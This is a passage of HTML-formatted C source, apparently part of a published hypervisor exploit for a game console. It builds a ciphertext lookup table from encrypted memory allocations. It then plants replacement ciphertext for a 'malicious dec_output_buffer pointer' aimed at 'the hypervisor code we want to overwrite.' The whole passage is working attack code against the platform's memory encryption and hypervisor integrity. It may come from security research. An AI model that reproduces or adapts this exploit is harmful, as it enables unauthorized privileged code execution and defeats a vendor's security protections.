span><span>)</span><span>(</span><span>pMemoryAddress</span><span> </span><span>+</span><span> </span><span>8</span><span>)</span><span> </span><span>=</span><span> </span><span>1</span><span>;</span><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>// cpu type = 1</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>__dcbst</span><span>(</span><span>0</span><span>,</span><span> </span><span>(</span><span>char</span><span> </span><span>*</span><span>)</span><span> </span><span>pMemoryAddress</span><span>)</span><span>;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>KeFlushCacheRange</span><span>(</span><span>pMemoryAddress</span><span>,</span><span> </span><span>0x80</span><span>)</span><span>;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>KeFlushCacheRange</span><span>(</span><span>pUpdateData</span><span> </span><span>+</span><span> </span><span>ScratchOffset</span><span>,</span><span> </span><span>0x80</span><span>)</span><span>;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>// Use the first N bits of the cipher text data as an index into the lookup table.</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>ULONGLONG </span><span>oracleData</span><span> </span><span>=</span><span> </span><span>*</span><span>(</span><span>ULONGLONG</span><span> </span><span>*</span><span>)</span><span>(</span><span>pUpdateData</span><span> </span><span>+</span><span> </span><span>ScratchOffset</span><span>)</span><span>;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>int</span><span> </span><span>index</span><span> </span><span>=</span><span> </span><span>oracleData</span><span> </span><span>&gt;&gt;</span><span> </span><span>(</span><span>64</span><span> </span><span>-</span><span> </span><span>HASH_BITS</span><span>)</span><span>;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>// Check if we hit a collision in the cipher text lookup table.</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>if</span><span> </span><span>(</span><span>pCipherTextData</span><span>-&gt;</span><span>OracleCipherText</span><span>[</span><span>index</span><span>]</span><span> </span><span>!=</span><span> </span><span>0</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>collisionCount</span><span>++</span><span>;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>// Add the current cipher text entry to the lookup table, overwriting any existing value.</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>pCipherTextData</span><span>-&gt;</span><span>OracleCipherText</span><span>[</span><span>index</span><span>]</span><span> </span><span>=</span><span> </span><span>oracleData</span><span>;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>// Get the corresponding cipher text for our malicious dec_output_buffer pointer which points to the hypervisor code we want to overwrite.</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>*</span><span>(</span><span>ULONGLONG</span><span>*</span><span>)</span><span>(</span><span>pMemoryAddress</span><span> </span><span>+</span><span> </span><span>0x2B20</span><span>)</span><span> </span><span>=</span><span> </span><span>pCipherTextData</span><span>-&gt;</span><span>dec_end_input_pos</span><span>;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>*</span><span>(</span><span>ULONGLONG</span><span>*</span><span>)</span><span>(</span><span>pMemoryAddress</span><span> </span><span>+</span><span> </span><span>0x2B28</span><span>)</span><span> </span><span>=</span><span> </span><span>pCipherTextData</span><span>-&gt;</span><span>dec_output_buffer</span><span>;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>__dcbst</span><span>(</span><span>0</span><span>,</span><span> </span><span>(</span><span>char</span><span> </span><span>*</span><span>)</span><span> </span><span>pMemoryAddress</span><span> </span><span>+</span><span> </span><span>0x2B00</span><span>)</span><span>;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>KeFlushCacheRange</span><span>(</span><span>pMemoryAddress</span><span> </span><span>+</span><span> </span><span>0x2B00</span><span>,</span><span> </span><span>0x80</span><span>)</span><span>;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>KeFlushCacheRange</span><span>(</span><span>pUpdateData</span><span> </span><span>+</span><span> </span><span>ScratchOffset</span><span> </span><span>+</span><span> </span><span>0x2B00</span><span>,</span><span> </span><span>0x80</span><span>)</span><span>;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>// Store cipher text for our malicious dec_output_buffer pointer into the lookup table.</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>pCipherTextData</span><span>-&gt;</span><span>ReplacementCipherText1</span><span>[</span><span>index</span><span>]</span><span> </span><span>=</span><span> </span><span>*</span><span>(</span><span>ULONGLONG</span><span> </span><span>*</span><span>)</span><span> </span><span>(</span><span>pUpdateData</span><span> </span><span>+</span><span> </span><span>ScratchOffset</span><span> </span><span>+</span><span> </span><span>0x2B20</span><span>)</span><span>;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>pCipherTextData</span><span>-&gt;</span><span>ReplacementCipherText2</span><span>[</span><span>index</span><span>]</span><span> </span><span>=</span><span> </span><span>*</span><span>(</span><span>ULONGLONG</span><span> </span><span>*</span><span>)</span><span> </span><span>(</span><span>pUpdateData</span><span> </span><span>+</span><span> </span><span>ScratchOffset</span><span> </span><span>+</span><span> </span><span>0x2B28</span><span>)</span><span>;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>// Free the encrypted allocation.</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>result</span><span> </span><span>=</span><span> </span><span>HvxEncryptedReleaseAllocation</span><span>(</span><span>(</span><span>DWORD</span><span>)</span><span>pMemoryAddress</span><span>)</span><span>;</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>}</span></p><p><span>}</span></p></div></td>
					</tr>
